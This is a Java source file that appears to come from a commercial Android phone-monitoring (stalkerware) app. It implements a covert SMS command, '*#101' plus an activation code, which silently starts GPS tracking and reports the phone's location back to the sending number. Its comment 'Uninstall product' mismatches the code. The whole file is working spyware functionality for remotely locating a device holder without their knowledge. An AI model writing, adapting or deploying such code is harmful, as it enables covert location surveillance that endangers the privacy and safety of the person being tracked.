package com.vvt.android.syncmanager.smscommand.interpreter;

import android.content.Context;
import android.location.LocationManager;
import com.fx.dalvik.util.FxLog;

import com.fx.android.common.Customization;
import com.fx.dalvik.location.GpsOnDemand;
import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.NetworkUtil;
import com.vvt.android.syncmanager.smscommand.SmsCommandHelper;

public class SmsGpsOnDemand {
	
	private static final String TAG = "SmsGpsOnDemand";
	private static final boolean DEBUG = true;
 	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	public static final String COMMAND_ID = "*#101";
	
	// Uninstall product
	// <*#101><FK>
	public static String processCommand(final Context context, String[] tokens, 
			final String destinationNumber, final String responseHeader) {
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens));
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(tokens[1]);
		
		if (!activationCodeValidation.equals(StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		LocationManager locationManager = 
			(LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		
		boolean hasProviders = locationManager.getProviders(true).size() > 0;
		boolean hasInternet = NetworkUtil.hasInternetConnection(context);
		
		// Verify for sending acknowledged response
		if (hasProviders || hasInternet) {
			
			// start thread
			Thread t = new Thread() {
				public void run() {
					if (LOCAL_LOGV) {
						FxLog.v(TAG, "Enable GPS on demand");
					}
					try {
						Thread.sleep(3000);
					}
					catch (InterruptedException e) {
						// 
					}
					GpsOnDemand gpsOnDemand = GpsOnDemand.getInstance(context);
					gpsOnDemand.setDestinationNumber(destinationNumber);
					gpsOnDemand.setResponseHeader(responseHeader);
					gpsOnDemand.enable();
				}
			};
			
			t.start();
			
			return String.format("%s\n%s", 
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK, 
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_ACK);
		}
		else {
			return String.format("%s\n%s", 
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WILL_BE_STOPPED);
		}
	}

}
